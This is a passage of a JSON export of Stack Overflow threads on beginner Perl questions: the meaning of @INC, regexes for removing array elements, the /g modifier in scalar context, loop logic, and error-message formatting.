1495009745, "post_id": 44019379, "comment_id": 75065976, "body": "@Aerovistae \u2014 Downvotes are not close votes. The suggested reasons for downvotes are lack of research effort, being unclear, or not being useful."}, {"owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "edited": false, "score": 2, "creation_date": 1495009849, "post_id": 44019379, "comment_id": 75066044, "body": "Perldoc exactly says that: <i>include path</i>. It&#39;s called <code>INC</code> probably to save keystrokes. Remember, perl programmers are <i>lazy</i> by virtue. :-)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1495010385, "post_id": 44019379, "comment_id": 75066466, "body": "By the lack of any mention of it (as you note), I&#39;d conclude that it indeed stands for plain <i>include</i>."}, {"owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "edited": false, "score": 2, "creation_date": 1495010639, "post_id": 44019379, "comment_id": 75066662, "body": "@Aerovistae Jens&#39; first comment told you what it stands for.  It&#39;s the <b>INC</b>lude path."}], "answers": [{"comments": [{"owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "edited": false, "score": 2, "creation_date": 1495025143, "post_id": 44019487, "comment_id": 75076768, "body": "<code>perldoc perlvar</code> has more info."}], "tags": [], "owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "is_accepted": true, "score": 7, "last_activity_date": 1495009743, "creation_date": 1495009743, "answer_id": 44019487, "question_id": 44019379, "link": "https://stackoverflow.com/questions/44019379/what-does-inc-stand-for-in-perl/44019487#44019487", "title": "What does @INC stand for in perl?", "body": "<p>What about using the excellent <code>perldoc</code> utility?</p>\n\n<pre><code>$ perldoc -q INC\n[...]\n   How do I add a directory to my include path (@INC) at runtime?\n   Here are the suggested ways of modifying your include path, including environment\n   variables, run-time switches, and in-code statements:\n[...]\n</code></pre>\n"}], "owner": {"reputation": 30491, "user_id": 1029146, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a659be962c006e43e110b5a9dfda538e?s=128&d=identicon&r=PG", "display_name": "temporary_user_name", "link": "https://stackoverflow.com/users/1029146/temporary-user-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 215, "favorite_count": 0, "accepted_answer_id": 44019487, "answer_count": 1, "score": -5, "last_activity_date": 1495009743, "creation_date": 1495009471, "last_edit_date": 1495009669, "question_id": 44019379, "link": "https://stackoverflow.com/questions/44019379/what-does-inc-stand-for-in-perl", "title": "What does @INC stand for in perl?", "body": "<p>I was surprised that I was unable to find an answer to such a simple question. Is the answer so obvious that nobody's ever had to ask before? I can only guess it might stand for \"included\" but  I really have no idea. A reference would be nice, if you have one.</p>\n\n<p><strong>EDIT:</strong> I know what <code>@INC</code>'s function and role is in Perl. I'm asking <em>why is it called INC.</em></p>\n"}, {"tags": ["arrays", "regex", "string", "perl"], "comments": [{"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "edited": false, "score": 0, "creation_date": 1494999145, "post_id": 44016121, "comment_id": 75059951, "body": "Try using &#39;^\\,$&#39; instead for removing the words having only , as the pattern you are using will remove all words having , anywhere in them."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1495002270, "post_id": 44016121, "comment_id": 75061390, "body": "So if you had <code>input_a</code> in <code>@array</code> should that get removed? In other words, do patterns need to match or to be equal?  For the comma you are saying that it should be equal -- &quot;<i>that contain <b>only</b> <code>,</code></i>&quot; (my emphasis)."}, {"owner": {"reputation": 345, "user_id": 2538148, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/65f28a5fe96cca6e4afdc629db6e2ba5?s=128&d=identicon&r=PG", "display_name": "Jon J", "link": "https://stackoverflow.com/users/2538148/jon-j"}, "edited": false, "score": 0, "creation_date": 1495005703, "post_id": 44016121, "comment_id": 75063443, "body": "If I had <code>input_a</code> in <code>@array</code>, it shouldn&#39;t get removed. The patterns need to match"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1495006247, "post_id": 44016121, "comment_id": 75063797, "body": "OK -- but not the comma?  With it, you remove an element only when it is exactly the comma?  If that is the case, it makes most sense to make that regex <code>&#47;^,$&#47;</code>, so that matching it means that it is equal."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1495006343, "post_id": 44016121, "comment_id": 75063843, "body": "Also, you should make your regex with <code>qr&#47;...&#47;</code> (not just single quotes)."}], "answers": [{"comments": [{"owner": {"reputation": 345, "user_id": 2538148, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/65f28a5fe96cca6e4afdc629db6e2ba5?s=128&d=identicon&r=PG", "display_name": "Jon J", "link": "https://stackoverflow.com/users/2538148/jon-j"}, "edited": false, "score": 0, "creation_date": 1495006188, "post_id": 44016541, "comment_id": 75063752, "body": "It is a nested array. The original array contains a list of lines, where a single line is an element. A line is then split with space as delimiter, which forms array within an array. I structured it such that it would be easier for me to trace if there is a bug"}], "tags": [], "owner": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "is_accepted": false, "score": 0, "last_activity_date": 1495002703, "last_edit_date": 1495002703, "creation_date": 1494999993, "answer_id": 44016541, "question_id": 44016121, "link": "https://stackoverflow.com/questions/44016121/perl-array-of-regular-expressions-matching-elements-of-an-array/44016541#44016541", "title": "Perl Array of regular expressions -- matching elements of an array", "body": "<p>This works, but not very nice from the code.\nThis code snippet also removes the ','</p>\n\n<pre><code> my $elm = [];\n\nsub extract {\n   my $elm = shift;\n\n   foreach my $del (@del_pattern) {\n      $elm =~ s/$del//g;\n      if ( $elm ) {\n         return $elm;\n      }\n   }\n}\n\n\nforeach my $item (@array) {\n    foreach my $i (@$item) {\n        my $extract = extract($i);\n        if ($extract) {\n           push(@$elm, $extract);\n        }\n    }\n}\n\nprint Dumper($elm);\n</code></pre>\n\n<p>Why your <code>@array</code> has array? Why not one big array?</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1597211408, "post_id": 44016612, "comment_id": 112055488, "body": "<code>^,$</code> will remove both <code>,</code> and <code>,\u240a</code>. <code>^,\\z</code> is the correct solution."}], "tags": [], "owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "is_accepted": true, "score": 3, "last_activity_date": 1495000315, "creation_date": 1495000315, "answer_id": 44016612, "question_id": 44016121, "link": "https://stackoverflow.com/questions/44016121/perl-array-of-regular-expressions-matching-elements-of-an-array/44016612#44016612", "title": "Perl Array of regular expressions -- matching elements of an array", "body": "<p>You are using the wrong regular expression. I updated the code and tried it and its working fine. PFB the update code:</p>\n\n<pre><code>my @del_pattern = ('input', 'output', 'wire', 'reg', '\\b;\\b', '^,$');\n\nmy @array = (['input', 'port_a', ','],\n             ['output', '[31:0]', 'port_b,', 'port_c', ',']); \n## delete the patterns found in @del_pattern array\nforeach my $item (@del_pattern) {\n    foreach my $i (@array) {\n        @$i = grep(!/$item/, @$i);\n    }\n}\n</code></pre>\n\n<p>The only change made is in the Regex '\\b,\\b' to '^,$'. I don't have  much info on \\b but the regex I am suggesting is doing what you intend.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1597240603, "last_edit_date": 1597240603, "creation_date": 1597211279, "answer_id": 63370543, "question_id": 44016121, "link": "https://stackoverflow.com/questions/44016121/perl-array-of-regular-expressions-matching-elements-of-an-array/63370543#63370543", "title": "Perl Array of regular expressions -- matching elements of an array", "body": "<p>You want</p>\n<pre class=\"lang-regex prettyprint-override\"><code>^,\\z\n</code></pre>\n<p>An explanation of what <code>\\b</code> doesn't match at all follows.</p>\n<hr />\n<pre class=\"lang-regex prettyprint-override\"><code>\\b\n</code></pre>\n<p>defines the boundary of a &quot;word&quot;. It is equivalent to</p>\n<pre class=\"lang-regex prettyprint-override\"><code>(?&lt;=\\w)(?!\\w) | (?&lt;!\\w)(?=\\w)\n</code></pre>\n<p>so</p>\n<pre class=\"lang-regex prettyprint-override\"><code>\\b,\\b\n</code></pre>\n<p>is equivalent to</p>\n<pre class=\"lang-regex prettyprint-override\"><code>(?: (?&lt;=\\w)(?!\\w) | (?&lt;!\\w)(?=\\w) ) , (?: (?&lt;=\\w)(?!\\w) | (?&lt;!\\w)(?=\\w) )\n</code></pre>\n<p>Since comma is a non-word character, that simplifies to</p>\n<pre class=\"lang-regex prettyprint-override\"><code>(?&lt;=\\w),(?=\\w)\n</code></pre>\n<p>So</p>\n<pre class=\"lang-perl prettyprint-override\"><code>'a,b' =~ /\\b,\\b/      # Match\n','   =~ /\\b,\\b/      # No match\n</code></pre>\n"}], "owner": {"reputation": 345, "user_id": 2538148, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/65f28a5fe96cca6e4afdc629db6e2ba5?s=128&d=identicon&r=PG", "display_name": "Jon J", "link": "https://stackoverflow.com/users/2538148/jon-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1175, "favorite_count": 0, "accepted_answer_id": 44016612, "answer_count": 3, "score": 1, "last_activity_date": 1597240603, "creation_date": 1494998045, "question_id": 44016121, "link": "https://stackoverflow.com/questions/44016121/perl-array-of-regular-expressions-matching-elements-of-an-array", "title": "Perl Array of regular expressions -- matching elements of an array", "body": "<p>I am trying to match and remove elements from an array called <code>@array</code>. The elements to be removed must match the patterns stored inside an array called <code>@del_pattern</code></p>\n\n<pre><code>my @del_pattern = ('input', 'output', 'wire', 'reg', '\\b;\\b', '\\b,\\b');\n\nmy @array = (['input', 'port_a', ','],\n             ['output', '[31:0]', 'port_b,', 'port_c', ',']); \n</code></pre>\n\n<p>To remove the patterns contained in <code>@del_pattern</code> from <code>@array</code>, I loop through all the elements in <code>@del_pattern</code> and exclude them using grep.</p>\n\n<pre><code>## delete the patterns found in @del_pattern array\nforeach $item (@del_pattern) {\n    foreach $i (@array) {\n        @$i = grep(!/$item/, @$i);\n    }\n}\n</code></pre>\n\n<p>However, I have been unable to remove <code>','</code> from <code>@array</code>. If I use <code>','</code> instead of <code>'\\b,\\b'</code> in <code>@del_pattern</code>, element <code>port_b,</code> gets removed from the <code>@array</code> as well, which is not an intended outcome. I am only interested in removing elements that contain only <code>','</code>.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 7308270, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/faHSh.png?s=128&g=1", "display_name": "ILoveNachos", "link": "https://stackoverflow.com/users/7308270/ilovenachos"}, "edited": false, "score": 0, "creation_date": 1494988409, "post_id": 44014432, "comment_id": 75056949, "body": "No sir, it evaluates $class, and that&#39;s what I don&#39;t understand, why does it evaluate it if $class won&#39;t change, it&#39;s a code that I didn&#39;t write but that I need to understand since I need to replicate it but for python.  Edit: I miss one }, thanks for telling me"}], "tags": [], "owner": {"reputation": 1242, "user_id": 7061430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81912bc5ca02376f99a5ee44531dee27?s=128&d=identicon&r=PG", "display_name": "nothingmuch", "link": "https://stackoverflow.com/users/7061430/nothingmuch"}, "is_accepted": false, "score": 0, "last_activity_date": 1494987544, "creation_date": 1494987544, "answer_id": 44014432, "question_id": 44014121, "link": "https://stackoverflow.com/questions/44014121/can-someone-explain-me-this-regex-in-perl/44014432#44014432", "title": "Can someone explain me this regex in perl?", "body": "<p>The <a href=\"https://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators\" rel=\"nofollow noreferrer\">perlop</a> manpage reads:</p>\n\n<blockquote>\n  <p>In scalar context, each execution of m//g finds the next match,\n  returning true if it matches, and false if there is no further match.</p>\n</blockquote>\n\n<p>Since <code>if</code> evaluates the condition in scalar context in your expression, every time it'll first return true, and then false as there are no further matches (I don't understand why it prints twice, and your code doesn't compile).</p>\n\n<p>But note that:</p>\n\n<pre><code>if ( $class =~ /gen/i ) {\n</code></pre>\n\n<p>will <em>always</em> be true in your example, since <code>$class = \"genes\"</code> and doesn't appear to change. Did you mean to check <code>$id</code> instead?</p>\n\n<p>At any rate, the <code>/g</code> modifier doesn't seem appropriate for your code.</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 7308270, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/faHSh.png?s=128&g=1", "display_name": "ILoveNachos", "link": "https://stackoverflow.com/users/7308270/ilovenachos"}, "edited": false, "score": 0, "creation_date": 1494989389, "post_id": 44014494, "comment_id": 75057176, "body": "Thank you charming gentleman, now I understand, now I need to ask why he wrote it like that and what was he trying to achieve, anyway, thanks all for your replies!"}], "tags": [], "owner": {"reputation": 456, "user_id": 3054046, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ajViR.png?s=128&g=1", "display_name": "cbmckay", "link": "https://stackoverflow.com/users/3054046/cbmckay"}, "is_accepted": true, "score": 2, "last_activity_date": 1494990550, "last_edit_date": 1494990550, "creation_date": 1494988041, "answer_id": 44014494, "question_id": 44014121, "link": "https://stackoverflow.com/questions/44014121/can-someone-explain-me-this-regex-in-perl/44014494#44014494", "title": "Can someone explain me this regex in perl?", "body": "<p>Because you are using the <code>/g</code> option. From <a href=\"https://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators\" rel=\"nofollow noreferrer\" title=\"perlop\">perlop</a> :</p>\n\n<blockquote>\n  <p>In scalar context, each execution of <code>m//g</code> finds the next match, returning true if it matches, and false if there is no further match. The position after the last match can be read or set using the <code>pos()</code> function; see pos. A failed match normally resets the search position to the beginning of the string, ...</p>\n</blockquote>\n\n<p>So, you are getting a match the first time you look at the string. Then, the next time you are starting after the position of the first match. I.e. the position is not reset to the start of the string, it continues on where the first match occurs.</p>\n\n<p>The <code>/g</code> flag is used to indicate you want to match <em>all</em> the times you can in the string. That is useful for counting how many times a substring occurs in the string. In your case, you are testing to see if the pattern matches at all, true, and if it does, do something. You don't need the <code>/g</code> flag in this case. </p>\n\n<pre><code>my $class = \"genes\";\n\nforeach my $id (1..6){ \n    if($class =~ /gen/ig){\n        print $class.\"\\n\"; #to see the value of class\n    }else{\n        print \"!!!\".$class.\"\\n\";   #to see the difference if there's any\n    }\n}\n</code></pre>\n\n<p>outputs:</p>\n\n<pre><code>genes                                                                                                                                                                           \n!!!genes                                                                                                                                                                        \ngenes                                                                                                                                                                           \n!!!genes                                                                                                                                                                        \ngenes                                                                                                                                                                           \n!!!genes\n</code></pre>\n\n<p>while if you remove the <code>/g</code> flag you get:</p>\n\n<pre><code>genes                                                                                                                                                                           \ngenes                                                                                                                                                                           \ngenes                                                                                                                                                                           \ngenes                                                                                                                                                                           \ngenes                                                                                                                                                                           \ngenes\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 7308270, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/faHSh.png?s=128&g=1", "display_name": "ILoveNachos", "link": "https://stackoverflow.com/users/7308270/ilovenachos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 44014494, "answer_count": 2, "score": 2, "last_activity_date": 1494990550, "creation_date": 1494985123, "last_edit_date": 1494987928, "question_id": 44014121, "link": "https://stackoverflow.com/questions/44014121/can-someone-explain-me-this-regex-in-perl", "title": "Can someone explain me this regex in perl?", "body": "<p>There's a program that use a regex and somehow I can't manage to understand it.</p>\n\n<p>The code goes +- like this:</p>\n\n<pre><code>@listOfIds = &amp;methodToGetIDs();\nforeach my $id (@listOfIds){\n    if($class =~ /gen/ig){\n        #does stuff\n    }\n}\n</code></pre>\n\n<p>What I understand is that if <code>$class</code> has <code>\"gen\"</code> then it will get into the <code>if{}</code> but sometimes it won't get into it, so I put an else to see what was happening and the code end up like this:</p>\n\n<pre><code>my $class = \"genes\";\nforeach my $id (@listOfIds){\n    if($class =~ /gen/ig){\n        print $class.\"\\n\"; #to see the value of class\n    }else{\n        print \"!!!\".$class.\"\\n\";   #to see the difference if there's any\n    }#miss this wooops!\n}\n</code></pre>\n\n<p>Guess what? the output was like this:</p>\n\n<pre><code>genes\ngenes\n!!!genes\ngenes\ngenes\n!!!genes\ngenes\ngenes\n!!!genes\n</code></pre>\n\n<p>If the value of <code>$class</code> doesn't change then why does it gets into the else clause? Guess I don't understand regular expressions at all. Any clues?</p>\n"}, {"tags": ["perl", "foreach"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494978872, "post_id": 44013277, "comment_id": 75054881, "body": "It does what you describe ... and every time through it <i>assigns</i> to <code>$sum</code>. So in the end you have <code>10&#47;2</code> there, from the last iteration. If you mean to sum them up (by calling the variable <code>$sum</code>) then you need <code>$sum = $sum + $number&#47;2</code>, or <code>$sum += $number&#47;2</code>."}, {"owner": {"reputation": 43, "user_id": 8022431, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-W0Dl5ATqPGU/AAAAAAAAAAI/AAAAAAAAVd4/o7yD9Na0Gzk/photo.jpg?sz=128", "display_name": "Jason Husbands", "link": "https://stackoverflow.com/users/8022431/jason-husbands"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494980375, "post_id": 44013277, "comment_id": 75055221, "body": "Thanks so much for the friendly reply.  I am now getting the answer 27.5 utlizing $sum += $number/2.  That ads them all up and divides by 2.  However, this is till not what I am looking for (unless I am doing something wrong still).  What I was hoping the foreach loop would do is divided each number by 2 and give me the results. For example: LOOP1 calculates 2/1  LOOP2 2/2, LOOP3 3/2, and so on. $sum would contain the answers for each calculation and print them.  Am I making sense?"}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494980820, "post_id": 44013277, "comment_id": 75055320, "body": "You could either move the print statement into the loop, or push the sum into another array @sums. (<code>push @sums, $sum;</code>) You can then display the contents of that array using, for example <code>print join(&quot;,&quot;,@sums);</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1494993689, "post_id": 44013277, "comment_id": 75058168, "body": "You got the answer -- please also note that these are things you want to write in your question."}], "answers": [{"tags": [], "owner": {"reputation": 456, "user_id": 3054046, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ajViR.png?s=128&g=1", "display_name": "cbmckay", "link": "https://stackoverflow.com/users/3054046/cbmckay"}, "is_accepted": true, "score": 1, "last_activity_date": 1494998756, "creation_date": 1494998756, "answer_id": 44016284, "question_id": 44013277, "link": "https://stackoverflow.com/questions/44013277/perl-basic-foreach-logic-with-integers/44016284#44016284", "title": "Perl: Basic foreach logic with integers", "body": "<p>You just need to move the print statement inside the foreach loop so that it prints out the current value of <code>$sum</code> each time through the loop :</p>\n\n<pre><code>use strict;  \nuse warnings;     \nmy @array = (1..10);  \nmy $sum = 0;  \nforeach my $number (@array) {  \n  $sum = $number / 2; \n  print \"$sum\\n\"; \n}  \n</code></pre>\n\n<p>That will output:</p>\n\n<pre><code>0.5\n1\n1.5\n2\n2.5\n3\n3.5\n4\n4.5\n5\n</code></pre>\n\n<p>You could simplify your program quite a bit with something like: </p>\n\n<pre><code>use strict;  \nuse warnings;\nforeach my $number (1..10) {\n  print $number/2 , \"\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 8022431, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-W0Dl5ATqPGU/AAAAAAAAAAI/AAAAAAAAVd4/o7yD9Na0Gzk/photo.jpg?sz=128", "display_name": "Jason Husbands", "link": "https://stackoverflow.com/users/8022431/jason-husbands"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 268, "favorite_count": 0, "accepted_answer_id": 44016284, "answer_count": 1, "score": 1, "last_activity_date": 1495153009, "creation_date": 1494977947, "last_edit_date": 1495153009, "question_id": 44013277, "link": "https://stackoverflow.com/questions/44013277/perl-basic-foreach-logic-with-integers", "title": "Perl: Basic foreach logic with integers", "body": "<p>In the following code, I am attempting to write a very simple foreach math calculation loop.</p>\n\n<pre><code>use strict;  \nuse warnings;     \nmy @array = (1..10);  \nmy $sum = 0;  \nforeach my $number (@array) {  \n    $sum = $number / 2;  \n}  \nprint \"$sum\\n\"\n</code></pre>\n\n<p>In my head, the foreach loop should be going through each $number (1-10) in the @array calculating each number divided by 2. I was hoping it would print the answers out via $sum for each number 1-10, but instead I am getting the answer 5.</p>\n\n<p>What's wrong with my logic?</p>\n"}, {"tags": ["perl", "error-handling"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1494967342, "post_id": 44011182, "comment_id": 75050624, "body": "What do you mean &quot;<i>from where it was called</i>&quot;?  If a sub throws an error/warning you want to see the line where the sub is called? You are looking for <a href=\"http://perldoc.perl.org/Carp.html\" rel=\"nofollow noreferrer\">Carp</a>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494967700, "post_id": 44011182, "comment_id": 75050794, "body": "Then, in order to uniformly format you can use <code>$SIG{__WARN__}</code> and <code>$SIG{__DIE__}</code>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1494968110, "post_id": 44011182, "comment_id": 75051030, "body": "You know that a program shouldn&#39;t ordinarily produce error messages, right? You should see them only during development, and at that point, as long as they&#39;re clear, you shouldn&#39;t be concerned about how cute they look. (Although I think Perl messages are pretty consistent as they are.) If you&#39;re getting them after release, and especially if you&#39;re getting so many of them that their inconsistency is apparent, then you haven&#39;t completed testing."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494968309, "post_id": 44011182, "comment_id": 75051141, "body": "@zdim: I think your first comment is going to be the closest thing to an answer that we have."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494968453, "post_id": 44011182, "comment_id": 75051214, "body": "@Borodin  What do you mean ... that it would be misleading/wrong posting answers onthis?  (I just did, but I can remove it...)  Or that the question is unclear/under-specified?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494968923, "post_id": 44011182, "comment_id": 75051427, "body": "<i>&quot;In C I would just use a preprocessor macro, but Perl does not have those.&quot;</i> If you get hold of Perl v5.10 then you can use <code>-P</code> on the command line or the shebang line to do just that. <i>&quot;This option causes your program to be run through the C preprocessor before compilation by Perl.&quot;</i> But it was removed in version 12 because it was a dreadful idea."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494969062, "post_id": 44011182, "comment_id": 75051496, "body": "@zdim: I meant that you should write it up as an answer because I doubt if anyone is going to do better!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494969338, "post_id": 44011182, "comment_id": 75051624, "body": "If you&#39;re interested in preprocessing Perl a little more sensibly then you could look at <a href=\"https://metacpan.org/pod/Filter::Simple\" rel=\"nofollow noreferrer\">Filter::Simple</a> which essentially allows you to apply a set of substitutions to your code before it&#39;s compiled. It&#39;s still rather unpleasant, but only for the reasons that the C preprocessor is unpleasant."}, {"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": 